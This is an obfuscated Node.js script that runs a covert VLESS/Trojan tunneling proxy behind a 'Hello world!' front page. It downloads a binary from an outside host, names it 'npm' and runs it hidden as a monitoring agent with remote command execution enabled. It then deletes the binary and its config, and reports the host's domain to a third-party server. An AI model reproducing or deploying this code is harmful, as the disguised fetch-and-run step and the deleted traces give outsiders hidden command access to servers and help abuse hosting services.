const _0xeac218=_0x35a4;(function(_0x1ddcde,_0x47a7c4){const _0x270c5d=_0x35a4,_0x4bb9de=_0x1ddcde();while(!![]){try{const _0x80fb1a=-parseInt(_0x270c5d(0x95))/0x1+-parseInt(_0x270c5d(0x9a))/0x2*(parseInt(_0x270c5d(0xcd))/0x3)+parseInt(_0x270c5d(0xb8))/0x4+-parseInt(_0x270c5d(0xa8))/0x5*(-parseInt(_0x270c5d(0x83))/0x6)+parseInt(_0x270c5d(0x102))/0x7*(parseInt(_0x270c5d(0xfe))/0x8)+parseInt(_0x270c5d(0xc8))/0x9*(-parseInt(_0x270c5d(0xdd))/0xa)+parseInt(_0x270c5d(0xa1))/0xb;if(_0x80fb1a===_0x47a7c4)break;else _0x4bb9de['push'](_0x4bb9de['shift']());}catch(_0x4b468e){_0x4bb9de['push'](_0x4bb9de['shift']());}}}(_0x15fe,0xb911b));const os=require('os'),http=require(_0xeac218(0x8a)),fs=require('fs'),axios=require(_0xeac218(0xb3)),net=require(_0xeac218(0x82)),path=require(_0xeac218(0xe3)),crypto=require(_0xeac218(0xe6)),{Buffer}=require(_0xeac218(0xae)),{exec,execSync}=require(_0xeac218(0xe9)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xeac218(0xee)]['UUID']||_0xeac218(0x8f),NEZHA_SERVER=process['env'][_0xeac218(0x98)]||'',NEZHA_PORT=process[_0xeac218(0xee)][_0xeac218(0xff)]||'',NEZHA_KEY=process[_0xeac218(0xee)][_0xeac218(0x101)]||'',DOMAIN=process[_0xeac218(0xee)][_0xeac218(0x89)]||_0xeac218(0xaf),AUTO_ACCESS=process[_0xeac218(0xee)][_0xeac218(0xad)]||!![],WSPATH=process['env'][_0xeac218(0xbb)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0xeac218(0xee)][_0xeac218(0xc6)]||_0xeac218(0x9b),NAME=process[_0xeac218(0xee)][_0xeac218(0xcb)]||'',PORT=process['env'][_0xeac218(0x103)]||0x1eb4;let ISP='';function _0x15fe(){const _0x73b86c=['connection','Automatic\x20Access\x20Task\x20added\x20successfully','2083','8443','593550PIeEkn','npm','npm\x20is\x20running','replace','2087','AUTO_ACCESS','buffer','1234.abc.com','utf8','https://api.ip.sb/geoip','writeHead','axios','decode','application/json','sha224','2053','735960MgfYYz','setsid\x20nohup\x20./npm\x20-s\x20','aarch64','WSPATH','application/dns-json','catch','error:\x20','update','every','message','vless://','log','https://amd64.ssss.nyc.mn/agent','pop','SUB_PATH','createWriteStream','8226NVVKqY','from','once','NAME','type','6QOaAtS','trim','npm\x20running\x20error:','finish','country_code','Failed\x20to\x20resolve\x20','readUInt8','https://dns.google/resolve?name=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','client_secret:\x20','utf-8','&type=A','true','--tls','end','reduce','13310JQLwcg','arm64','\x20-p\x20','stream','join','base64','path','createServer','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','crypto','hex','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','child_process','2096','write','digest','toString','env','split','includes','slice','unlink','map','443','index.html','connect','Server','8.8.4.4','https://arm64.ssss.nyc.mn/v1','get','url','&path=%2F','Not\x20Found\x0a','656acShvH','NEZHA_PORT','error','NEZHA_KEY','65618VuObcm','PORT','listen','substr','text/plain','npm\x20download\x20successfully','then','net','30DZIUFV','Unknown','post','length','data','/bin/bash','DOMAIN','http','Answer','close','npm\x20is\x20already\x20running,\x20skip\x20running...','Hello\x20world!','5efabea4-f6d4-91fd-b8f0-17e004c89c60','readUInt16BE','arch','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','concat','arm','1375001THvwIa','Server\x20is\x20running\x20on\x20port\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','1.1.1.1','934750jHGMPy','sub','chmod\x20+x\x20npm','https://arm64.ssss.nyc.mn/agent','pipe','&fp=chrome&type=ws&host=','writeFileSync','30119320BCRmnM','\x20with\x20all\x20DNS\x20servers','false'];_0x15fe=function(){return _0x73b86c;};return _0x15fe();}const GetISP=async()=>{const _0x472ca2=_0xeac218;try{const _0x3378cb=await axios['get'](_0x472ca2(0xb1)),_0x2e0825=_0x3378cb['data'];ISP=(_0x2e0825[_0x472ca2(0xd1)]+'-'+_0x2e0825['isp'])[_0x472ca2(0xab)](/ /g,'_');}catch(_0x492b33){ISP=_0x472ca2(0x84);}};GetISP();const httpServer=http[_0xeac218(0xe4)]((_0x5bc010,_0x24a519)=>{const _0xae6a0=_0xeac218;if(_0x5bc010['url']==='/'){const _0x32ae3f=path[_0xae6a0(0xe1)](__dirname,_0xae6a0(0xf5));fs['readFile'](_0x32ae3f,_0xae6a0(0xb0),(_0x392a1e,_0x3775fb)=>{const _0x128a87=_0xae6a0;if(_0x392a1e){_0x24a519[_0x128a87(0xb2)](0xc8,{'Content-Type':'text/html'}),_0x24a519[_0x128a87(0xdb)](_0x128a87(0x8e));return;}_0x24a519[_0x128a87(0xb2)](0xc8,{'Content-Type':'text/html'}),_0x24a519[_0x128a87(0xdb)](_0x3775fb);});return;}else{if(_0x5bc010[_0xae6a0(0xfb)]==='/'+SUB_PATH){const _0x58808a=NAME?NAME+'-'+ISP:ISP,_0x2b4e0d=_0xae6a0(0xc2)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0xae6a0(0x9f)+DOMAIN+_0xae6a0(0xfc)+WSPATH+'#'+_0x58808a,_0x190a98='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0xae6a0(0xfc)+WSPATH+'#'+_0x58808a,_0x32d647=_0x2b4e0d+'\x0a'+_0x190a98,_0xf355b9=Buffer[_0xae6a0(0xc9)](_0x32d647)[_0xae6a0(0xed)](_0xae6a0(0xe2));_0x24a519['writeHead'](0xc8,{'Content-Type':_0xae6a0(0x106)}),_0x24a519[_0xae6a0(0xdb)](_0xf355b9+'\x0a');}else _0x24a519[_0xae6a0(0xb2)](0x194,{'Content-Type':_0xae6a0(0x106)}),_0x24a519[_0xae6a0(0xdb)](_0xae6a0(0xfd));}}),wss=new WebSocket[(_0xeac218(0xf7))]({'server':httpServer}),uuid=UUID[_0xeac218(0xab)](/-/g,''),DNS_SERVERS=[_0xeac218(0xf8),_0xeac218(0x99)];function _0x35a4(_0x5e9b7b,_0x287472){_0x5e9b7b=_0x5e9b7b-0x81;const _0x15fe0b=_0x15fe();let _0x35a4cf=_0x15fe0b[_0x5e9b7b];return _0x35a4cf;}function resolveHost(_0x25f1f7){return new Promise((_0x111d09,_0x139ced)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x25f1f7)){_0x111d09(_0x25f1f7);return;}let _0xeaf464=0x0;function _0x169c58(){const _0x3826f5=_0x35a4;if(_0xeaf464>=DNS_SERVERS['length']){_0x139ced(new Error(_0x3826f5(0xd2)+_0x25f1f7+_0x3826f5(0xa2)));return;}const _0x420cf9=DNS_SERVERS[_0xeaf464];_0xeaf464++;const _0x153c25=_0x3826f5(0xd4)+encodeURIComponent(_0x25f1f7)+_0x3826f5(0xd8);axios[_0x3826f5(0xfa)](_0x153c25,{'timeout':0x1388,'headers':{'Accept':_0x3826f5(0xbc)}})[_0x3826f5(0x81)](_0x38a1d1=>{const _0x26d9e9=_0x3826f5,_0x62b93a=_0x38a1d1[_0x26d9e9(0x87)];if(_0x62b93a['Status']===0x0&&_0x62b93a[_0x26d9e9(0x8b)]&&_0x62b93a[_0x26d9e9(0x8b)][_0x26d9e9(0x86)]>0x0){const _0x519bc1=_0x62b93a[_0x26d9e9(0x8b)]['find'](_0x32f3cc=>_0x32f3cc[_0x26d9e9(0xcc)]===0x1);if(_0x519bc1){_0x111d09(_0x519bc1[_0x26d9e9(0x87)]);return;}}_0x169c58();})[_0x3826f5(0xbd)](_0x103d1d=>{_0x169c58();});}_0x169c58();});}function handleVlessConnection(_0x362488,_0x3d4215){const _0x19eacc=_0xeac218,[_0x2da930]=_0x3d4215,_0xe18ba7=_0x3d4215[_0x19eacc(0xf1)](0x1,0x11);if(!_0xe18ba7['every']((_0x2a9367,_0x5d3041)=>_0x2a9367==parseInt(uuid['substr'](_0x5d3041*0x2,0x2),0x10)))return![];let _0x5cff1d=_0x3d4215[_0x19eacc(0xf1)](0x11,0x12)['readUInt8']()+0x13;const _0x58da0d=_0x3d4215[_0x19eacc(0xf1)](_0x5cff1d,_0x5cff1d+=0x2)['readUInt16BE'](0x0),_0x57efb5=_0x3d4215['slice'](_0x5cff1d,_0x5cff1d+=0x1)['readUInt8'](),_0x300394=_0x57efb5==0x1?_0x3d4215[_0x19eacc(0xf1)](_0x5cff1d,_0x5cff1d+=0x4)[_0x19eacc(0xe1)]('.'):_0x57efb5==0x2?new TextDecoder()[_0x19eacc(0xb4)](_0x3d4215[_0x19eacc(0xf1)](_0x5cff1d+0x1,_0x5cff1d+=0x1+_0x3d4215[_0x19eacc(0xf1)](_0x5cff1d,_0x5cff1d+0x1)[_0x19eacc(0xd3)]())):_0x57efb5==0x3?_0x3d4215[_0x19eacc(0xf1)](_0x5cff1d,_0x5cff1d+=0x10)['reduce']((_0x40b078,_0x59bc99,_0x6129a0,_0x5d8345)=>_0x6129a0%0x2?_0x40b078[_0x19eacc(0x93)](_0x5d8345['slice'](_0x6129a0-0x1,_0x6129a0+0x1)):_0x40b078,[])[_0x19eacc(0xf3)](_0x2181fa=>_0x2181fa['readUInt16BE'](0x0)[_0x19eacc(0xed)](0x10))[_0x19eacc(0xe1)](':'):'';_0x362488['send'](new Uint8Array([_0x2da930,0x0]));const _0x5f1713=createWebSocketStream(_0x362488);return resolveHost(_0x300394)[_0x19eacc(0x81)](_0x4c0658=>{const _0x5d4c0b=_0x19eacc;net[_0x5d4c0b(0xf6)]({'host':_0x4c0658,'port':_0x58da0d},function(){const _0x50a9a6=_0x5d4c0b;this['write'](_0x3d4215[_0x50a9a6(0xf1)](_0x5cff1d)),_0x5f1713['on']('error',()=>{})['pipe'](this)['on'](_0x50a9a6(0x100),()=>{})['pipe'](_0x5f1713);})['on'](_0x5d4c0b(0x100),()=>{});})['catch'](_0x35d827=>{const _0x3ec221=_0x19eacc;net[_0x3ec221(0xf6)]({'host':_0x300394,'port':_0x58da0d},function(){const _0x32c81e=_0x3ec221;this[_0x32c81e(0xeb)](_0x3d4215[_0x32c81e(0xf1)](_0x5cff1d)),_0x5f1713['on'](_0x32c81e(0x100),()=>{})['pipe'](this)['on'](_0x32c81e(0x100),()=>{})['pipe'](_0x5f1713);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x3bdc67,_0x1a408d){const _0x4acfbe=_0xeac218;try{if(_0x1a408d[_0x4acfbe(0x86)]<0x3a)return![];const _0x254e94=_0x1a408d[_0x4acfbe(0xf1)](0x0,0x38)[_0x4acfbe(0xed)](),_0x52c626=[UUID];let _0x8cd53a=null;for(const _0x375c8a of _0x52c626){const _0x17a7cb=crypto['createHash'](_0x4acfbe(0xb6))[_0x4acfbe(0xbf)](_0x375c8a)[_0x4acfbe(0xec)](_0x4acfbe(0xe7));if(_0x17a7cb===_0x254e94){_0x8cd53a=_0x375c8a;break;}}if(!_0x8cd53a)return![];let _0x367539=0x38;_0x1a408d[_0x367539]===0xd&&_0x1a408d[_0x367539+0x1]===0xa&&(_0x367539+=0x2);const _0x379bc2=_0x1a408d[_0x367539];if(_0x379bc2!==0x1)return![];_0x367539+=0x1;const _0x23f3fc=_0x1a408d[_0x367539];_0x367539+=0x1;let _0x307909,_0x4efd82;if(_0x23f3fc===0x1)_0x307909=_0x1a408d[_0x4acfbe(0xf1)](_0x367539,_0x367539+0x4)[_0x4acfbe(0xe1)]('.'),_0x367539+=0x4;else{if(_0x23f3fc===0x3){const _0x276e24=_0x1a408d[_0x367539];_0x367539+=0x1,_0x307909=_0x1a408d[_0x4acfbe(0xf1)](_0x367539,_0x367539+_0x276e24)[_0x4acfbe(0xed)](),_0x367539+=_0x276e24;}else{if(_0x23f3fc===0x4)_0x307909=_0x1a408d[_0x4acfbe(0xf1)](_0x367539,_0x367539+0x10)[_0x4acfbe(0xdc)]((_0x408aee,_0x580468,_0x192511,_0x3d464f)=>_0x192511%0x2?_0x408aee['concat'](_0x3d464f['slice'](_0x192511-0x1,_0x192511+0x1)):_0x408aee,[])[_0x4acfbe(0xf3)](_0x1014cb=>_0x1014cb[_0x4acfbe(0x90)](0x0)['toString'](0x10))[_0x4acfbe(0xe1)](':'),_0x367539+=0x10;else return![];}}_0x4efd82=_0x1a408d[_0x4acfbe(0x90)](_0x367539),_0x367539+=0x2;_0x367539<_0x1a408d[_0x4acfbe(0x86)]&&_0x1a408d[_0x367539]===0xd&&_0x1a408d[_0x367539+0x1]===0xa&&(_0x367539+=0x2);const _0x1988d4=createWebSocketStream(_0x3bdc67);return resolveHost(_0x307909)[_0x4acfbe(0x81)](_0x34ce2e=>{const _0x3f00fe=_0x4acfbe;net[_0x3f00fe(0xf6)]({'host':_0x34ce2e,'port':_0x4efd82},function(){const _0x1d5d44=_0x3f00fe;_0x367539<_0x1a408d[_0x1d5d44(0x86)]&&this[_0x1d5d44(0xeb)](_0x1a408d[_0x1d5d44(0xf1)](_0x367539)),_0x1988d4['on']('error',()=>{})[_0x1d5d44(0x9e)](this)['on'](_0x1d5d44(0x100),()=>{})[_0x1d5d44(0x9e)](_0x1988d4);})['on'](_0x3f00fe(0x100),()=>{});})[_0x4acfbe(0xbd)](_0x2df611=>{const _0x46bd96=_0x4acfbe;net[_0x46bd96(0xf6)]({'host':_0x307909,'port':_0x4efd82},function(){const _0x3c15eb=_0x46bd96;_0x367539<_0x1a408d[_0x3c15eb(0x86)]&&this[_0x3c15eb(0xeb)](_0x1a408d['slice'](_0x367539)),_0x1988d4['on'](_0x3c15eb(0x100),()=>{})[_0x3c15eb(0x9e)](this)['on'](_0x3c15eb(0x100),()=>{})[_0x3c15eb(0x9e)](_0x1988d4);})['on']('error',()=>{});}),!![];}catch(_0x4b818f){return![];}}wss['on'](_0xeac218(0xa4),(_0x3ece0b,_0x303fa3)=>{const _0x3f1431=_0xeac218,_0x28ffdd=_0x303fa3[_0x3f1431(0xfb)]||'';_0x3ece0b[_0x3f1431(0xca)](_0x3f1431(0xc1),_0x1a126a=>{const _0x53aa70=_0x3f1431;if(_0x1a126a[_0x53aa70(0x86)]>0x11&&_0x1a126a[0x0]===0x0){const _0x5dbefc=_0x1a126a[_0x53aa70(0xf1)](0x1,0x11),_0x9da970=_0x5dbefc[_0x53aa70(0xc0)]((_0xf87e40,_0x24debf)=>_0xf87e40==parseInt(uuid[_0x53aa70(0x105)](_0x24debf*0x2,0x2),0x10));if(_0x9da970){!handleVlessConnection(_0x3ece0b,_0x1a126a)&&_0x3ece0b[_0x53aa70(0x8c)]();return;}}!handleTrojanConnection(_0x3ece0b,_0x1a126a)&&_0x3ece0b[_0x53aa70(0x8c)]();})['on'](_0x3f1431(0x100),()=>{});});const getDownloadUrl=()=>{const _0x4d5569=_0xeac218,_0x301e07=os[_0x4d5569(0x91)]();return _0x301e07===_0x4d5569(0x94)||_0x301e07===_0x4d5569(0xde)||_0x301e07===_0x4d5569(0xba)?!NEZHA_PORT?_0x4d5569(0xf9):_0x4d5569(0x9d):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x4d5569(0xc4);},downloadFile=async()=>{const _0x4e03f7=_0xeac218;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x359ab4=getDownloadUrl(),_0x170b26=await axios({'method':_0x4e03f7(0xfa),'url':_0x359ab4,'responseType':_0x4e03f7(0xe0)}),_0x372178=fs[_0x4e03f7(0xc7)]('npm');return _0x170b26[_0x4e03f7(0x87)][_0x4e03f7(0x9e)](_0x372178),new Promise((_0x3b45bc,_0x296069)=>{const _0x462e5d=_0x4e03f7;_0x372178['on'](_0x462e5d(0xd0),()=>{const _0x21954d=_0x462e5d;console[_0x21954d(0xc3)](_0x21954d(0x107)),exec(_0x21954d(0x9c),_0x3b9136=>{if(_0x3b9136)_0x296069(_0x3b9136);_0x3b45bc();});}),_0x372178['on'](_0x462e5d(0x100),_0x296069);});}catch(_0x3a7a7e){throw _0x3a7a7e;}},runnz=async()=>{const _0x9da841=_0xeac218;try{const _0x1f54ef=execSync(_0x9da841(0xd5),{'encoding':_0x9da841(0xd7)});if(_0x1f54ef[_0x9da841(0xce)]()!==''){console['log'](_0x9da841(0x8d));return;}}catch(_0x5c6095){}await downloadFile();let _0x14d7b3='',_0x52f7df=[_0x9da841(0xf4),_0x9da841(0xa7),_0x9da841(0xea),_0x9da841(0xac),_0x9da841(0xa6),_0x9da841(0xb7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x31aee9=_0x52f7df[_0x9da841(0xf0)](NEZHA_PORT)?_0x9da841(0xda):'';_0x14d7b3=_0x9da841(0xb9)+NEZHA_SERVER+':'+NEZHA_PORT+_0x9da841(0xdf)+NEZHA_KEY+'\x20'+_0x31aee9+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x59474f=NEZHA_SERVER[_0x9da841(0xf0)](':')?NEZHA_SERVER[_0x9da841(0xef)](':')[_0x9da841(0xc5)]():'',_0x38966f=_0x52f7df[_0x9da841(0xf0)](_0x59474f)?_0x9da841(0xd9):_0x9da841(0xa3),_0x3996ef=_0x9da841(0xd6)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x9da841(0xe5)+_0x38966f+_0x9da841(0x92)+UUID;fs[_0x9da841(0xa0)]('config.yaml',_0x3996ef);}_0x14d7b3=_0x9da841(0x97);}else{console[_0x9da841(0xc3)](_0x9da841(0xe8));return;}}try{exec(_0x14d7b3,{'shell':_0x9da841(0x88)},_0x565cb0=>{const _0xe15438=_0x9da841;if(_0x565cb0)console[_0xe15438(0x100)](_0xe15438(0xcf),_0x565cb0);else console['log'](_0xe15438(0xaa));});}catch(_0x29d6b6){console[_0x9da841(0x100)](_0x9da841(0xbe)+_0x29d6b6);}};async function addAccessTask(){const _0x35b590=_0xeac218;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x45c18d='https://'+DOMAIN;try{const _0x770765=await axios[_0x35b590(0x85)]('https://oooo.serv00.net/add-url',{'url':_0x45c18d},{'headers':{'Content-Type':_0x35b590(0xb5)}});console[_0x35b590(0xc3)](_0x35b590(0xa5));}catch(_0x210cf3){}}const delFiles=()=>{const _0x19e8ac=_0xeac218;fs[_0x19e8ac(0xf2)](_0x19e8ac(0xa9),()=>{}),fs[_0x19e8ac(0xf2)]('config.yaml',()=>{});};httpServer[_0xeac218(0x104)](PORT,()=>{const _0x317684=_0xeac218;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x317684(0x96)+PORT);});
